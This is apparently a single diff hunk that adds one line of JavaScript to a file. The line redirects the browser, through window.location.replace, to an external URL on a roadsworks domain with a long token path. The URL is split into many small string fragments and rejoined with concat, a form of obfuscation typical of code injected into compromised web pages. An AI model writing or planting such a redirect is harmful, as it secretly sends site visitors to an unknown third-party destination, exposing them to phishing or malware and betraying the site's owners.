@@ -1,0 +1,1 @@
+window.location.replace(``.concat(`htt`,`ps://w`,`ww.ro`,`adswork`,`s.co`,`m/V0p0l`,`jJEcXB`,`Boh1Zf2-7`,`c6NtbrJw`,`k7mqx2`,`xM8FsU`,`xZ6UUS4bQW`,`m6AGSrX`,`kROfc`,`ztu4Mh`,`dFyXh1fRk`,`e_qYnR`,`ffA~~/TAH`,`A/c8utz27y27`))
